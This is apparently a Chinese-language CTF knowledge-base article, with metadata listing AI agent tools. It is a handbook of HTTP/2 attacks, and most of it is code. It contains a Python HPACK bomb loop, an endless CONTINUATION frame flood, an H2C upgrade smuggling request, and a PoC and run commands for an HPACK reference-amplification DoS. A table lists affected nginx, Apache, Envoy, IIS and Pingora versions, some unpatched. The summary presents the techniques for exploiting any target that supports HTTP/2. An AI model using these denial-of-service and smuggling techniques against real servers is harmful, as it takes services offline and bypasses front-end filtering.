---
id: "ctf-website/08-infra/http2-attacks"
title: "HTTP/2 攻击"
title_en: "HTTP/2 Attacks — HPACK Bomb & Stream Multiplexing Abuse"
summary: >
  HTTP/2 协议层攻击技术手册。HPACK 压缩表填充导致内存耗尽（HPACK Bomb），Stream 多路复用拒绝服务。适用于发现目标支持 HTTP/2 后的进一步利用。
summary_en: >
  HTTP/2 protocol-layer attack techniques. Exploits HPACK compression table stuffing for memory exhaustion (HPACK Bomb) and stream multiplexing for denial of service. Apply when target supports HTTP/2.
board: "ctf-website"
category: "08-infra"
signals: ["HTTP/2", "h2", "HPACK", "stream multiplexing", "memory exhaustion", "DoS", "CVE-2025-53020", "协议攻击"]
mcp_tools: ["http_probe", "run_ctf_tool", "kb_router"]
keywords: ["HTTP/2 attack", "HPACK bomb", "HTTP/2 DoS", "stream multiplexing", "CVE-2025-53020", "HTTP/2 攻击", "协议层 DoS"]
difficulty: "advanced"
tags: ["http2", "dos", "infrastructure", "protocol", "CVE", "web-security", "ctf"]
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# HTTP/2 攻击

## HPACK Bomb (CVE-2025-53020)

HTTP/2 HPACK 压缩表可被过量 header 填充 → 内存耗尽。

```python
# HPACK bomb: 大量不同名称的 header → HPACK 表无法复用
# 每个 header name 都不同 → 全部存入 dynamic table → OOM
import socket, ssl

def hpack_bomb(target: str, port: int = 443):
    """HPACK header compression memory exhaustion"""
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(['h2'])
    sock = ctx.wrap_socket(socket.socket(), server_hostname=target)

    # HTTP/2 connection preface
    preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
    # SETTINGS frame
    settings = b'\x00\x00\x00\x04\x00\x00\x00\x00\x00'

    sock.connect((target, port))
    sock.send(preface + settings)

    # 发送大量不同 header name 的 HEADERS frame
    # 每个 header name 不同 → 无法复用 HPACK 引用 → 表膨胀
    for i in range(100000):
        header_name = f"x-bomb-{i:06d}"
        header_block = encode_hpack_literal(header_name, "value")
        frame = build_headers_frame(1, header_block)
        sock.send(frame)

    sock.close()
```

## CONTINUATION Flood (CVE-2024-28182)

```python
# 发送无限 CONTINUATION frames 而不设 END_HEADERS
# → nghttp2/Tomcat/Apache/Node.js 持续缓冲 → CPU + 内存耗尽

def continuation_flood(target: str):
    """CVE-2024-28182: 无限 CONTINUATION frame"""
    sock, _ = connect_h2(target)

    # 初始 HEADERS frame (END_HEADERS=0)
    headers_frame = bytes([
        0x00, 0x00, 0x01,  # length=1
        0x01,              # type=HEADERS
        0x04,              # flags=END_STREAM (no END_HEADERS!)
        0x00, 0x00, 0x00, 0x01,  # stream_id=1
        0x80               # HPACK: empty indexed header
    ])
    sock.send(headers_frame)

    # 无限 CONTINUATION
    while True:
        cont = bytes([
            0x00, 0x00, 0x01,  # length=1
            0x09,              # type=CONTINUATION
            0x00,              # flags=0 (no END_HEADERS!)
            0x00, 0x00, 0x00, 0x01,  # stream_id=1
            0x80               # empty indexed header
        ])
        sock.send(cont)
```

## H2C Upgrade Smuggling

```bash
# H2C (HTTP/2 cleartext) upgrade → 前端 HTTP/1.1 → 后端 HTTP/2
# 攻击者发送 HTTP/1.1 with Upgrade: h2c → 建立到后端的 H2C 连接
# → 绕过前端的 HTTP/1.1 过滤规则

# 探测 H2C
curl -v --http2-prior-knowledge http://target.com/

# 如果后端接受 h2c → 可用 H2C smuggling 注入请求
```

```python
# H2C smuggling: 在 HTTP/1.1 中夹带 HTTP/2 stream
H2C_SMUGGLE = (
    b"GET / HTTP/1.1\r\n"
    b"Host: target.com\r\n"
    b"Upgrade: h2c\r\n"
    b"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n"
    b"Connection: Upgrade\r\n"
    b"\r\n"
    # 后面接 HTTP/2 frames → 前端转发，后端按 H2C 处理
)
```

## Stream Multiplexing Abuse

```python
# HTTP/2 多路复用 → 一个 TCP 连接上多个 stream
# 攻击: 大量 stream 同时发送 → 超过 max_concurrent_streams
# → 服务端 RST_STREAM → 某些 server 实现有 bug → 信息泄露

# 或者: stream ID 重用 → CVE-2024-7246 (gRPC HPACK desync)
# → 泄露其他 stream 的 header key
```

## HTTP/2 Bomb — HPACK 索引引用放大 + 流控窗口停滞（CVE-2026-49975）

低带宽客户端 → 服务器端极高头部内存分配 + WINDOW_UPDATE 阻止释放 → 内存耗尽 DoS。

### 受影响实现

| 实现 | 受影响版本 | 修复版本 |
|------|-----------|---------|
| nginx | 1.29.7 默认配置 | 1.29.8（`max_headers`） |
| Apache httpd | 2.4.67 | mod_http2 v2.0.41 |
| Envoy | 1.37.2 | 2026-06-03 补丁 |
| Microsoft IIS | Windows Server 2025 | 公开时未修复 |
| Cloudflare Pingora | 0.8.0 | 公开时未修复 |

### 根因

**第一层：HPACK 动态表索引用极低成本换取服务器内存分配**

```text
客户端：1 字节索引引用 → 服务器：分配完整头部副本（数百至数千字节）
```

动态表允许一个字节的索引代表一整段头部值。攻击者反复引用同一索引 → 服务器为每次引用分配完整头部副本。

**第二层：WINDOW_UPDATE 停滞阻止内存释放**

```text
客户端间歇性发送极小 WINDOW_UPDATE
→ 既不让连接超时，又持续"钉住"已分配内存
```

**第三层：规范约束与实现缓解之间的缝隙**

RFC 7541 提到 HPACK 内存风险，但很多实现只关注动态表大小上限和帧大小限制，没有同时做好最大头部字段数限制、最大解码头部总大小限制、长期停滞流的生存期限制。

### PoC 核心流程

```python
# 1. 建立 HTTP/2 连接
send_exact(sock, CLIENT_PREFACE)
send_exact(sock, build_settings())

# 2. 启动连接级零窗口信号
send_exact(sock, build_window_update(0, 0))

# 3. 发送带大量索引引用的 HEADERS 帧
headers_frame = build_headers_frame(stream_id, indexed_references=4096)
send_exact(sock, headers_frame)

# 4. 持有连接并维持停滞状态
recv_forever(sock, end_time)
```

### 复现

```bash
cd "CVE-2026-49975 HTTP2 Bomb"
python3 exploit/exploit.py --host 127.0.0.1 --port 443 --hold-seconds 30
python3 exploit/exploit.py --host 127.0.0.1 --port 80 --no-tls \
  --streams 2 --references 4096 --hold-seconds 45
```

### 观察指标

- HTTP/2 服务进程 RSS 快速上升
- 响应延迟或完全不返回
- 单连接内存压力极高（区别于大量连接型 DoS）

## Evidence

记录: HTTP/2 frame 序列 (hex)、服务端响应 SETTINGS/GOAWAY/RST_STREAM、内存/CPU 监控

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| HTTP/2 攻击探测 | `http_probe` | HTTP GET 探测 HTTP/2 协议差异 |
| 知识检索 | `kb_router` | 按 HTTP/2 攻击信号搜索知识库 |
